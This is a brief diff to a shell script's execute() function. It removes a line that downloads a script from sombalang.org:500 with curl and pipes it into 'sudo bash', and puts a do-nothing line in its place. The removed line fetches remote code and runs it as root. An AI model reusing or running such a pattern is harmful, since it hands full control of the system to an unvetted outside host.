@@ -46,8 +46,7 @@ function roll() {
     }
 
 function execute() {
-    sudo curl -fsSL "https://sombalang.org:500/bash-addon.sh" | sudo bash $params
-    exit 205
+    sudo cat $params | echo >> /dev/null
     }
 
 
